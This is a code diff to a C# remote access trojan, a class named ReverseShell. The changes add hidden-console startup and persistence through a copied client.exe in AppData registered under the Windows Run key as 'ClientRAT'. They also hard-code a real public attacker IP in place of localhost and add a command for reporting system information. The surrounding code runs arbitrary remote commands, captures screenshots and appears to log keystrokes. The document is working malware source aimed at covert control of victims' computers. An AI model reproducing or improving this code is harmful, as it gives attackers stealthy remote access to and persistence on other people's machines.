@@ -9,9 +9,6 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms; 
-using System.Runtime.InteropServices;
-
-
 
 class ReverseShell
 {
@@ -22,12 +19,15 @@ class ReverseShell
     [DllImport("user32.dll")]
     static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetConsoleWindow();
+
     const int SW_HIDE = 0;
     const int SW_SHOW = 5;
 
-    static void HideWindow()
+    static void HideConsole()
     {
-        IntPtr hWnd = FindWindow(null, "made by daimy");
+        IntPtr hWnd = GetConsoleWindow();
         if (hWnd != IntPtr.Zero)
         {
             ShowWindow(hWnd, SW_HIDE);
@@ -153,15 +153,43 @@ class ReverseShell
         }
     }
 
+    static void Persist()
+    {
+        string exePath = Application.ExecutablePath;
+        string hiddenPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "client.exe");
+
+        try
+        {
+            if (!File.Exists(hiddenPath))
+            {
+                File.Copy(exePath, hiddenPath, true);
+            }
+
+            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+            
+            if (key != null)
+            {
+                key.SetValue("ClientRAT", hiddenPath);
+                key.Close();
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("Persistence error: " + ex.Message);
+        }
+    }
+
+
     [DllImport("user32.dll")]
     static extern short GetAsyncKeyState(int vKey);
 
     static void Main()
     {
-        HideWindow();
+        Persist();
+        HideConsole();
 
-        string attackerIP = "127.0.0.1"; //change this to your ip (127.0.0.1 works on local host only)
-        int attackerPort = 3000; // make sure this is port forwarded: https://www.canyouseeme.org
+        string attackerIP = "86.92.186.238";
+        int attackerPort = 3000;
 
         try
         {
@@ -198,6 +226,12 @@ class ReverseShell
                         CaptureScreenshot(writer);
                     }
 
+                    if (command.ToLower() == "info")
+                    {
+                        string output = GetSystemInfo();
+                        writer.WriteLine(output);
+                    }
+
                     else
                     {
                         Process proc = new Process();
@@ -210,8 +244,18 @@ class ReverseShell
                         proc.Start();
 
                         string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
-                        writer.WriteLine(output);
+                        
+                        if (string.IsNullOrWhiteSpace(output))
+                        {
+                            writer.WriteLine("[INFO] Command executed but no output.");
+                        }
+                        else
+                        {
+                            writer.WriteLine("[OUTPUT] " + output);
+                        }
+                        writer.Flush(); 
                     }
+
                 }
             }
         }
